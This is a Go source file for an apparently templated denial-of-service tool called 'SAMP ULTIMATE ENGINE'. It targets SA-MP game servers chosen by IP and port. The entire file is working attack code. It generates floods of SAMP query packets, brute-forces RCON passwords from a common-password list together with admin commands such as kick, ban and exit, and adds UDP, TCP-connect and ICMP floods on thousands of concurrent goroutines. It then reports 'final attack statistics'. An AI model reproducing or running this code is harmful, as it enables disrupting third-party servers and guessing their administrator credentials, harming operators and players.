package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// ==================== TEMPLATE VARIABLES ====================
var (
	targetIP   = "{{.TargetIP}}"
	targetPort = "{{.TargetPort}}"
	duration   = "{{.Duration}}"
	threads    = "{{.Threads}}"
	method     = "{{.Method}}"
)

// ==================== KONSTANTA ====================
const (
	SAMP_MAGIC    = "SAMP"
	SAMP_MIN_SIZE = 11  // Minimum: SAMP(4) + IP(4) + Port(2) + Opcode(1)
	SAMP_MAX_SIZE = 512 // Maximum valid size
	
	MAX_THREADS     = 50000
	SOCKET_BUF_SIZE = 16 * 1024 * 1024
)

// ==================== GLOBAL STATE ====================
var (
	totalPackets uint64 = 0
	totalBytes   uint64 = 0
	startTime    time.Time
	stopTime     time.Time
	
	targetAddr      *net.UDPAddr
	targetIPBytes   [4]byte
	targetPortInt   int
	targetPortBytes [2]byte
	
	cfg struct {
		threadCount  int
		durationSec  int
		attackMethod string
		burstMin     int
		burstMax     int
	}
	
	udpPool sync.Pool
	rngPool sync.Pool
	
	variants struct {
		standard   [][]byte
		withPrefix [][]byte
		rcon       [][]byte
		ping       [][]byte
		invalid    [][]byte
	}
)

type ConnPool struct {
	conn *net.UDPConn
	mu   sync.Mutex
	id   uint64
}

// ==================== MAIN ====================
func main() {
	if err := initConfig(); err != nil {
		fmt.Fprintf(os.Stderr, "Init error: %v\n", err)
		os.Exit(1)
	}
	
	if err := setupNetwork(); err != nil {
		fmt.Fprintf(os.Stderr, "Network error: %v\n", err)
		os.Exit(1)
	}
	
	generateVariants()
	initPools()
	printBanner()
	executeAttack()
	waitAndReport()
}

func initConfig() error {
	var err error
	
	cfg.durationSec, err = strconv.Atoi(duration)
	if err != nil || cfg.durationSec <= 0 {
		cfg.durationSec = 60
	}
	
	baseThreads, _ := strconv.Atoi(threads)
	if baseThreads <= 0 {
		baseThreads = 1000
	}
	cfg.threadCount = baseThreads * runtime.NumCPU()
	if cfg.threadCount > MAX_THREADS {
		cfg.threadCount = MAX_THREADS
	}
	
	cfg.attackMethod = strings.ToUpper(strings.TrimSpace(method))
	if cfg.attackMethod == "" {
		cfg.attackMethod = "GOD"
	}
	
	cfg.burstMin = 1
	cfg.burstMax = 20
	
	stopTime = time.Now().Add(time.Duration(cfg.durationSec) * time.Second)
	startTime = time.Now()
	
	return nil
}

func setupNetwork() error {
	port, err := strconv.Atoi(targetPort)
	if err != nil {
		return fmt.Errorf("invalid port: %v", err)
	}
	targetPortInt = port
	
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", targetIP, port))
	if err != nil {
		return fmt.Errorf("resolve failed: %v", err)
	}
	targetAddr = addr
	
	parts := strings.Split(targetIP, ".")
	if len(parts) != 4 {
		return fmt.Errorf("invalid IP format")
	}
	for i, p := range parts {
		val, err := strconv.Atoi(p)
		if err != nil || val < 0 || val > 255 {
			return fmt.Errorf("invalid IP octet: %s", p)
		}
		targetIPBytes[i] = byte(val)
	}
	
	// Little Endian port bytes [^4^]
	targetPortBytes[0] = byte(port & 0xFF)
	targetPortBytes[1] = byte((port >> 8) & 0xFF)
	
	return nil
}

func initPools() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	
	udpPool = sync.Pool{
		New: func() interface{} {
			conn, err := net.DialUDP("udp", nil, targetAddr)
			if err != nil {
				return nil
			}
			
			if file, err := conn.File(); err == nil {
				fd := int(file.Fd())
				syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, SOCKET_BUF_SIZE)
				syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 4*1024*1024)
				syscall.SetNonblock(fd, true)
				file.Close()
			}
			
			return &ConnPool{
				conn: conn,
				id:   uint64(rand.Int63()),
			}
		},
	}
	
	rngPool = sync.Pool{
		New: func() interface{} {
			return rand.New(rand.NewSource(time.Now().UnixNano() + rand.Int63()))
		},
	}
}

// ==================== PACKET GENERATION (FIXED) ====================
func generateVariants() {
	fmt.Printf("[*] Generating packet variants...\n")
	
	// Generate dengan size yang aman
	variants.standard = make([][]byte, 50000)
	for i := 0; i < 50000; i++ {
		variants.standard[i] = buildSAMPPacket(i, false)
	}
	
	variants.withPrefix = make([][]byte, 50000)
	for i := 0; i < 50000; i++ {
		variants.withPrefix[i] = buildSAMPPacket(i, true)
	}
	
	variants.rcon = make([][]byte, 10000)
	for i := 0; i < 10000; i++ {
		variants.rcon[i] = buildRCONPacket(i)
	}
	
	variants.ping = make([][]byte, 10000)
	for i := 0; i < 10000; i++ {
		variants.ping[i] = buildPingPacket(i)
	}
	
	variants.invalid = make([][]byte, 5000)
	for i := 0; i < 5000; i++ {
		variants.invalid[i] = buildInvalidPacket(i)
	}
	
	fmt.Printf("[+] Generated: %d standard, %d prefix, %d rcon, %d ping, %d invalid\n",
		len(variants.standard), len(variants.withPrefix), len(variants.rcon), 
		len(variants.ping), len(variants.invalid))
}

func buildSAMPPacket(variant int, usePrefix bool) []byte {
	buf := new(bytes.Buffer)
	
	// Optional prefix
	if usePrefix {
		prefix := getPrefix(variant)
		buf.Write(prefix)
	}
	
	// Core SAMP structure [^4^]
	buf.WriteString(SAMP_MAGIC)
	buf.Write(targetIPBytes[:])
	buf.Write(targetPortBytes[:])
	buf.WriteByte(getOpcode(variant))
	
	// Padding untuk mencapai target size (16-512 bytes)
	currentSize := buf.Len()
	if currentSize < SAMP_MAX_SIZE {
		// Random size antara currentSize dan SAMP_MAX_SIZE
		targetSize := currentSize + (variant % (SAMP_MAX_SIZE - currentSize + 1))
		if targetSize > currentSize && targetSize <= SAMP_MAX_SIZE {
			padding := make([]byte, targetSize-currentSize)
			fillPattern(padding, variant)
			buf.Write(padding)
		}
	}
	
	return buf.Bytes()
}

func buildRCONPacket(variant int) []byte {
	buf := new(bytes.Buffer)
	
	// Header
	buf.WriteString(SAMP_MAGIC)
	buf.Write(targetIPBytes[:])
	buf.Write(targetPortBytes[:])
	buf.WriteByte(0x78) // RCON opcode
	
	// Passwords dengan random suffix
	passwords := []string{
		"rcon", "password", "1234", "admin", "samp", "owner", "server",
		"123456", "qwerty", "letmein", "gta", "sanandreas", "changeme",
		"root", "toor", "pass", "samp037", "samp03DL", "gta_sa", 
		" multiplayer", "sa-mp", "12345", "111111", "dragon", "master",
		"shadow", "superman", "batman", "trustno1", "iloveyou", "princess",
		"football", "baseball", "welcome", "monkey", "696969",
	}
	
	commands := []string{
		"echo", "hostname", "gamemodetext", "mapname", "players", "maxplayers",
		"weburl", "worldtime", "weather", "loadfs", "unloadfs", "reloadfs",
		"ban", "kick", "kill", "say", "broadcast", "changemode", "gmx",
		"exit", "query", "rcon_password", "message", "cmdlist", "varlist",
	}
	
	basePass := passwords[variant%len(passwords)]
	suffix := strconv.Itoa(variant % 10000)
	pass := basePass + suffix
	
	cmd := commands[(variant/len(passwords))%len(commands)]
	
	passBytes := []byte(pass)
	cmdBytes := []byte(cmd)
	
	// Length-prefixed [^4^]
	binary.Write(buf, binary.LittleEndian, uint32(len(passBytes)))
	buf.Write(passBytes)
	binary.Write(buf, binary.LittleEndian, uint32(len(cmdBytes)))
	buf.Write(cmdBytes)
	
	// Pastikan size valid
	result := buf.Bytes()
	if len(result) > SAMP_MAX_SIZE {
		result = result[:SAMP_MAX_SIZE]
	}
	return result
}

func buildPingPacket(variant int) []byte {
	buf := new(bytes.Buffer)
	
	buf.WriteString(SAMP_MAGIC)
	buf.Write(targetIPBytes[:])
	buf.Write(targetPortBytes[:])
	buf.WriteByte(0x70) // Ping opcode
	
	// 4 bytes random data [^4^]
	data := make([]byte, 4)
	binary.BigEndian.PutUint32(data, uint32(variant*2654435761))
	buf.Write(data)
	
	// Padding jika perlu (minimal 16 bytes)
	if buf.Len() < 16 {
		padding := make([]byte, 16-buf.Len())
		buf.Write(padding)
	}
	
	return buf.Bytes()
}

// FIX: buildInvalidPacket yang sebelumnya error
func buildInvalidPacket(variant int) []byte {
	buf := new(bytes.Buffer)
	
	// Prefix
	prefix := getPrefix(variant + 1000)
	buf.Write(prefix)
	
	buf.WriteString(SAMP_MAGIC)
	buf.Write(targetIPBytes[:])
	buf.Write(targetPortBytes[:])
	
	// Opcode invalid
	invalidOps := []byte{0x00, 0xFF, 0x41, 0x42, 0x43, 0x44, 0x45, 0x50, 0x51, 0x52}
	opcode := invalidOps[variant%len(invalidOps)]
	buf.WriteByte(opcode)
	
	// FIX: Pastikan size calculation tidak negative
	currentLen := buf.Len()
	targetSize := 16 + (variant % 100) // 16-115 bytes
	
	// Safety check: hanya tambah padding jika targetSize > currentLen
	if targetSize > currentLen && targetSize <= SAMP_MAX_SIZE {
		paddingSize := targetSize - currentLen
		if paddingSize > 0 { // Double check positive
			payload := make([]byte, paddingSize)
			rand.Read(payload)
			buf.Write(payload)
		}
	}
	
	return buf.Bytes()
}

func getPrefix(variant int) []byte {
	prefixes := [][]byte{
		{0xFF, 0xFF, 0xFF, 0xFF},
		{0x00, 0x00, 0x00, 0x00},
		{0xAA, 0xAA, 0xAA, 0xAA},
		{0x55, 0x55, 0x55, 0x55},
		{0xDE, 0xAD, 0xBE, 0xEF},
		{0xCA, 0xFE, 0xBA, 0xBE},
	}
	
	if variant%10 < 6 {
		return prefixes[variant%len(prefixes)]
	}
	
	p := make([]byte, 4)
	rand.Read(p)
	return p
}

func getOpcode(variant int) byte {
	opcodes := []byte{0x69, 0x72, 0x63, 0x64, 0x70, 0x78} // i, r, c, d, p, x
	return opcodes[variant%len(opcodes)]
}

func fillPattern(data []byte, variant int) {
	pattern := variant % 8
	switch pattern {
	case 0:
		rand.Read(data)
	case 1:
		// Zeros - already zero
	case 2:
		for i := range data {
			data[i] = 0xFF
		}
	case 3:
		for i := range data {
			data[i] = byte(i % 256)
		}
	case 4:
		for i := range data {
			if i%2 == 0 {
				data[i] = 0xAA
			} else {
				data[i] = 0x55
			}
		}
	case 5:
		for i := range data {
			data[i] = SAMP_MAGIC[i%4]
		}
	case 6:
		for i := range data {
			data[i] = byte((variant + i) % 256)
		}
	case 7:
		ts := uint32(time.Now().Unix())
		for i := range data {
			data[i] = byte(ts >> (8 * (i % 4)))
		}
	}
}

// ==================== ATTACK ====================
func executeAttack() {
	fmt.Printf("[ATTACK] Method: %s | Threads: %d\n", cfg.attackMethod, cfg.threadCount)
	
	switch cfg.attackMethod {
	case "SAMP":
		executeSAMPAttack()
	case "UDP":
		executeUDPFlood()
	case "MIX":
		executeMixedAttack()
	case "GOD":
		executeGodMode()
	default:
		executeGodMode()
	}
}

func executeSAMPAttack() {
	fmt.Printf("[VECTOR] SAMP Protocol Attack\n")
	
	var wg sync.WaitGroup
	
	stdCount := cfg.threadCount * 50 / 100
	prefixCount := cfg.threadCount * 30 / 100
	rconCount := cfg.threadCount - stdCount - prefixCount
	
	for i := 0; i < stdCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			workerSAMP(id, variants.standard)
		}(i)
	}
	
	for i := 0; i < prefixCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			workerSAMP(id, variants.withPrefix)
		}(i)
	}
	
	for i := 0; i < rconCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			workerSAMP(id, variants.rcon)
		}(i)
	}
	
	wg.Wait()
}

func workerSAMP(workerID int, pool [][]byte) {
	conn := getConn()
	if conn == nil {
		return
	}
	defer putConn(conn)
	
	rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
	
	for time.Now().Before(stopTime) {
		idx := rng.Intn(len(pool))
		packet := pool[idx]
		
		burst := cfg.burstMin + rng.Intn(cfg.burstMax-cfg.burstMin+1)
		for b := 0; b < burst; b++ {
			sendPacket(conn, packet)
			if b < burst-1 {
				spinWait(50 + rng.Intn(100))
			}
		}
		
		if workerID%100 == 0 {
			runtime.Gosched()
		}
	}
}

func executeUDPFlood() {
	fmt.Printf("[VECTOR] Raw UDP Flood\n")
	
	var wg sync.WaitGroup
	
	for i := 0; i < cfg.threadCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			
			conn := getConn()
			if conn == nil {
				return
			}
			defer putConn(conn)
			
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
			
			for time.Now().Before(stopTime) {
				size := SAMP_MIN_SIZE + rng.Intn(SAMP_MAX_SIZE-SAMP_MIN_SIZE+1)
				payload := make([]byte, size)
				rng.Read(payload)
				
				if id%3 == 0 {
					copy(payload[4:], []byte(SAMP_MAGIC))
				}
				
				sendPacket(conn, payload)
			}
		}(i)
	}
	
	wg.Wait()
}

func executeMixedAttack() {
	fmt.Printf("[VECTOR] Mixed Mode\n")
	
	var wg sync.WaitGroup
	
	sampT := cfg.threadCount * 60 / 100
	udpT := cfg.threadCount - sampT
	
	for i := 0; i < sampT; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			if id%2 == 0 {
				workerSAMP(id, variants.standard)
			} else {
				workerSAMP(id, variants.withPrefix)
			}
		}(i)
	}
	
	for i := 0; i < udpT; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			
			conn := getConn()
			if conn == nil {
				return
			}
			defer putConn(conn)
			
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
			
			for time.Now().Before(stopTime) {
				size := 64 + rng.Intn(448)
				pkt := make([]byte, size)
				rng.Read(pkt)
				sendPacket(conn, pkt)
			}
		}(i)
	}
	
	wg.Wait()
}

func executeGodMode() {
	fmt.Printf("[VECTOR] GOD MODE\n")
	
	vectors := map[string]int{
		"STANDARD": cfg.threadCount * 25 / 100,
		"PREFIX":   cfg.threadCount * 20 / 100,
		"RCON":     cfg.threadCount * 15 / 100,
		"PING":     cfg.threadCount * 10 / 100,
		"INVALID":  cfg.threadCount * 10 / 100,
		"UDP":      cfg.threadCount * 10 / 100,
		"TCP":      cfg.threadCount * 5 / 100,
		"ICMP":     cfg.threadCount * 5 / 100,
	}
	
	var wg sync.WaitGroup
	
	for vec, count := range vectors {
		switch vec {
		case "STANDARD":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) { defer wg.Done(); workerSAMP(id, variants.standard) }(i)
			}
		case "PREFIX":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) { defer wg.Done(); workerSAMP(id, variants.withPrefix) }(i)
			}
		case "RCON":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) { defer wg.Done(); workerSAMP(id, variants.rcon) }(i)
			}
		case "PING":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) { defer wg.Done(); workerSAMP(id, variants.ping) }(i)
			}
		case "INVALID":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) { defer wg.Done(); workerSAMP(id, variants.invalid) }(i)
			}
		case "UDP":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) {
					defer wg.Done()
					conn := getConn()
					if conn == nil { return }
					defer putConn(conn)
					rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
					for time.Now().Before(stopTime) {
						pkt := make([]byte, 256)
						rng.Read(pkt)
						sendPacket(conn, pkt)
					}
				}(i)
			}
		case "TCP":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) {
					defer wg.Done()
					for time.Now().Before(stopTime) {
						c, _ := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, targetPortInt), time.Second)
						if c != nil {
							c.Close()
							atomic.AddUint64(&totalPackets, 1)
						}
						time.Sleep(time.Millisecond)
					}
				}(i)
			}
		case "ICMP":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) {
					defer wg.Done()
					c, err := net.Dial("ip4:icmp", targetIP)
					if err != nil { return }
					defer c.Close()
					pkt := make([]byte, 64)
					pkt[0] = 8
					for time.Now().Before(stopTime) {
						c.Write(pkt)
						atomic.AddUint64(&totalPackets, 1)
						time.Sleep(time.Millisecond * 10)
					}
				}(i)
			}
		}
	}
	
	wg.Wait()
}

// ==================== UTILITIES ====================
func getConn() *ConnPool {
	c := udpPool.Get()
	if c == nil {
		return nil
	}
	return c.(*ConnPool)
}

func putConn(c *ConnPool) {
	if c != nil && c.conn != nil {
		udpPool.Put(c)
	}
}

func sendPacket(c *ConnPool, data []byte) {
	if c == nil || len(data) == 0 {
		return
	}
	
	c.mu.Lock()
	n, err := c.conn.Write(data)
	c.mu.Unlock()
	
	if err == nil && n > 0 {
		atomic.AddUint64(&totalPackets, 1)
		atomic.AddUint64(&totalBytes, uint64(n))
	}
}

func spinWait(ns int) {
	start := time.Now()
	for time.Since(start).Nanoseconds() < int64(ns) {
		runtime.Gosched()
	}
}

func printBanner() {
	fmt.Printf("\n")
	fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║              SAMP ULTIMATE ENGINE v8.0 - PROTOCOL PERFECTION                 ║\n")
	fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════╣\n")
	fmt.Printf("║ Target: %-22s Port: %-8d Threads: %-10d              ║\n", targetIP, targetPortInt, cfg.threadCount)
	fmt.Printf("║ Duration: %-20ds Method: %-12s                                   ║\n", cfg.durationSec, cfg.attackMethod)
	fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════╝\n")
	fmt.Printf("\n")
}

func waitAndReport() {
	ticker := time.NewTicker(5 * time.Second)
	done := make(chan bool)
	
	go func() {
		for {
			select {
			case <-ticker.C:
				elapsed := time.Since(startTime).Seconds()
				pkts := atomic.LoadUint64(&totalPackets)
				bytes := atomic.LoadUint64(&totalBytes)
				
				pps := float64(pkts) / elapsed
				mbps := (float64(bytes) * 8.0) / (elapsed * 1024 * 1024)
				
				fmt.Printf("\r⏳ %.0fs | PPS: %.0f | MBPS: %.1f | Packets: %s", 
					elapsed, pps, mbps, formatNum(pkts))
			case <-done:
				return
			}
		}
	}()
	
	time.Sleep(time.Until(stopTime))
	done <- true
	ticker.Stop()
	
	printFinalStats()
}

func printFinalStats() {
	pkts := atomic.LoadUint64(&totalPackets)
	bytes := atomic.LoadUint64(&totalBytes)
	dur := uint64(cfg.durationSec)
	
	fmt.Printf("\n\n")
	fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║                           FINAL ATTACK STATISTICS                            ║\n")
	fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════╣\n")
	fmt.Printf("║  📦 TOTAL PACKETS:  %-20s                                   ║\n", formatNum(pkts))
	fmt.Printf("║  📊 TOTAL DATA:     %-10.2f MB (%-6.2f GB)                           ║\n", 
		float64(bytes)/(1024*1024), float64(bytes)/(1024*1024*1024))
	fmt.Printf("║  ⚡ AVERAGE PPS:    %-20s                                   ║\n", formatNum(pkts/dur))
	fmt.Printf("║  🌐 AVERAGE MBPS:   %-10.2f                                   ║\n", 
		(float64(bytes*8)/float64(dur))/(1024*1024))
	fmt.Printf("║  💀 AVERAGE GBPS:   %-10.2f                                   ║\n", 
		(float64(bytes*8)/float64(dur))/(1024*1024*1024))
	fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════╝\n")
}

func formatNum(n uint64) string {
	if n < 1000 {
		return fmt.Sprintf("%d", n)
	}
	if n < 1000000 {
		return fmt.Sprintf("%.1fK", float64(n)/1000)
	}
	if n < 1000000000 {
		return fmt.Sprintf("%.1fM", float64(n)/1000000)
	}
	return fmt.Sprintf("%.1fB", float64(n)/1000000000)
}
